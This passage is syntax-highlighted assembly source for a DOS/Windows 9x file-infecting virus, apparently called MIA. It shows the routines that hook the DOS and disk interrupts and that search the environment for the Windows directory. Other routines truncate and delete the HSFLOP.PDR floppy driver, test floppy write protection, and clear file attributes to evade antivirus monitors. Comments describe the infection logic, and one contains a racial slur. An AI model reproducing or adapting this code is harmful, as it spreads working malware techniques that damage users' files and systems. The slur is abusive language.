 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Internal</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Bait</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">F_Off</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Internal</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

</span><span class="sc5">Increment</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">             </span><span class="sc1">; Seek ASCIZ</span><span class="sc0">
 </span><span class="sc6">ja</span><span class="sc0">     </span><span class="sc5">Increment</span><span class="sc0">
 </span><span class="sc6">std</span><span class="sc0">                           </span><span class="sc1">; Set direction</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">cmpsb</span><span class="sc0">                  </span><span class="sc1">; Compare some bytes ('MIA.COM')</span><span class="sc0">
 </span><span class="sc6">cld</span><span class="sc0">                           </span><span class="sc1">; Clear direction</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Spick</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">F_Off</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc1">; Compare SI with initial pointer</span><span class="sc0">
 </span><span class="sc6">ja</span><span class="sc0">     </span><span class="sc5">Fox</span><span class="sc0">                    </span><span class="sc1">; Jump if above</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">2Fh</span><span class="sc0">   </span><span class="sc1">; '/'</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Fox</span><span class="sc0">
 </span><span class="sc6">cmpsb</span><span class="sc0">                         </span><span class="sc1">; '\'</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Spick</span><span class="sc0">

</span><span class="sc5">Fox</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">                   </span><span class="sc1">; Pop all registers</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0020h</span><span class="sc0">               </span><span class="sc1">; "Sharing violation" ?</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Return_Error</span><span class="sc0">

</span><span class="sc5">Spick</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0">                 </span><span class="sc1">; Open disk file?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Further</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6Ch</span><span class="sc0">                 </span><span class="sc1">; Extended open/create?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Outside</span><span class="sc0">

</span><span class="sc5">Further</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Unarchive</span><span class="sc0">              </span><span class="sc1">; Check whether there's a nigga in our midst</span><span class="sc0">
 </span><span class="sc6">jnbe</span><span class="sc0">   </span><span class="sc5">Outside</span><span class="sc0">
                               </span><span class="sc1">; If a sucker is in its action, don't try to</span><span class="sc0">
</span><span class="sc5">Trixie</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; infect the file! </span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Lollipop</span><span class="sc0">

</span><span class="sc5">Outside</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Disable_Equipments</span><span class="sc0">     </span><span class="sc1">; Disable IRQ 1 &amp; 2</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ROM_BIOS</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get disk interrupt handler vector</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Vectorize</span><span class="sc0">              </span><span class="sc1">; Set INT 13h</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; BX = 004Ch</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Lseek_BOF</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc0">        </span><span class="sc1">; Copy some codes into unused buffer </span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Slack</span><span class="sc0">        </span><span class="sc1">; (boot-record buffer)</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">movsw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Disk_IO</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Disk_IO</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">movsb</span><span class="sc0">                  </span><span class="sc1">; Copy INT 15h handler</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">                 </span><span class="sc1">; Installing viral INT 15h handler...</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Lseek_BOF</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Slack</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Vectorize</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Save old vector</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                 
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">Flop_BIOS</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Restore BIOS floppy disk handler</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Vectorize</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">23h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4A33h</span><span class="sc0">               </span><span class="sc1">; Multiplex INT, function AX=4A33h, MS-DOS</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">2Fh</span><span class="sc0">                    </span><span class="sc1">; v7.00+ installation check.</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; AX = nonzero if older version or other DOS</span><span class="sc0">
 </span><span class="sc6">jnl</span><span class="sc0">    </span><span class="sc5">Terrible</span><span class="sc0">               </span><span class="sc1">; Jump if OF &amp; SF states don't differ</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                  </span><span class="sc1">; Warning: BX, DX, SI, and DS were destroyed!</span><span class="sc0">

</span><span class="sc5">Devour</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">                 </span><span class="sc1">; (Equal to function AH=51h)</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Get current PSP segment in BX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">002Ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Get segment of environment for current process</span><span class="sc0">

</span><span class="sc5">Forcible</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Forcible</span><span class="sc0">               </span><span class="sc1">; Seek ASCIZ</span><span class="sc0">

</span><span class="sc5">Wrong</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; If double ASCIZ, reaching the end of</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Terrible</span><span class="sc0">               </span><span class="sc1">; variables and strings in environment</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">               </span><span class="sc1">; Convert AX to lowercase</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6977h</span><span class="sc0">               </span><span class="sc1">; 'wi' ?</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Forcible</span><span class="sc0">               </span><span class="sc1">; Nope, seek again        </span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">                         </span><span class="sc1">; Get 3rd letter of that variable</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc0">                </span><span class="sc1">; Convert it to uppercase</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">                 </span><span class="sc1">; Is 3rd letter 'N' ?</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Forcible</span><span class="sc0">               </span><span class="sc1">; No, another search</span><span class="sc0">

</span><span class="sc5">Equalize</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; Zero? oh wrong variable!</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Wrong</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0">                 </span><span class="sc1">; Is it a '=' ?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Equalize</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">               </span><span class="sc1">; Function AX=4301h, set file attributes</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                  </span><span class="sc1">; Save in BX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Alloc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WinVxD</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Lseek_BOF</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DIsk_IO</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">Outbuild</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">movsb</span><span class="sc0">                         </span><span class="sc1">; Copy character into buffer</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">             </span><span class="sc1">; End of string?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Outbuild</span><span class="sc0">               </span><span class="sc1">; Loop if not</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WinVxD</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">movsw</span><span class="sc0">                  </span><span class="sc1">; Copy VxD directory/filename just after it</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Clear attributes of HSFLOP.PDR</span><span class="sc0">
 </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">Spare</span><span class="sc0">                  </span><span class="sc1">; Branch if not failed</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                 </span><span class="sc1">; Problem: file not found?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Terrible</span><span class="sc0">               
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; That means the directory exists</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Devour</span><span class="sc0">           </span><span class="sc1">; MIA will seek the file again </span><span class="sc0">

</span><span class="sc5">Spare</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Ch</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Open and truncate the file</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Terrible</span><span class="sc0">               </span><span class="sc1">; Hmm, too many handles?</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Then close the floppy VxD</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; And then unlink it! 8-)</span><span class="sc0">

</span><span class="sc5">Terrible</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6C00h</span><span class="sc0">               </span><span class="sc1">; Extended open/create (for FAT32 drives?)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">               </span><span class="sc1">; BH = flags, BL = access mode</span><span class="sc0">
 </span><span class="sc6">cwd</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">; DX = action if file exists/not</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">F_Off</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Load filename</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; CX must be 0001h (file opened) if no error</span><span class="sc0">
 </span><span class="sc6">sbb</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; CX - DX - CF = 0001h - 0001h - 0000h = ?</span><span class="sc0">
 </span><span class="sc6">jcxz</span><span class="sc0">   </span><span class="sc5">Slapjack</span><span class="sc0">               </span><span class="sc1">; Zero? so no problem!</span><span class="sc0">

</span><span class="sc5">Garbage</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Zing</span><span class="sc0">

</span><span class="sc5">Slapjack</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; Returns AX = handle</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1220h</span><span class="sc0">               
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; Store file handle into BP</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">2Fh</span><span class="sc0">                    </span><span class="sc1">; Get Job File Table (JFT) entry to ES:[DI]</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Garbage</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1216h</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Get SFT entry number for victim file handle</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">
 </span><span class="sc6">ja</span><span class="sc0">     </span><span class="sc5">Garbage</span><span class="sc0">                </span><span class="sc1">; Unopened?</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">2Fh</span><span class="sc0">                    </span><span class="sc1">; Get System file table (SFT) for handle BX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">SFT_Off</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">        </span><span class="sc1">; Save SFT entry point vector </span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">SFT_Off</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Test... file has been written?</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Writeable</span><span class="sc0">              </span><span class="sc1">; Jump if yes </span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                 </span><span class="sc1">; File's in drive C ?</span><span class="sc0">
 </span><span class="sc6">jnb</span><span class="sc0">    </span><span class="sc5">Writeable</span><span class="sc0">              </span><span class="sc1">; Bomb if not A or B </span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                 </span><span class="sc1">; Bit 2 - 3 set, read data from controller</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">03F5h</span><span class="sc0">               </span><span class="sc1">; Port 03F5h, 8272A = command for first FDC</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">                      </span><span class="sc1">; Wait while working...</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">                      </span><span class="sc1">; Wait again? 8-S</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; Read ST3 from port...</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Test bit 6 if set...</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Garbage</span><span class="sc0">                </span><span class="sc1">; Write protected??? jump if yes! 8-O</span><span class="sc0">

</span><span class="sc5">Writeable</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; Clear attributes (avoids AV TSR watchdogs)</span><span class="sc0">
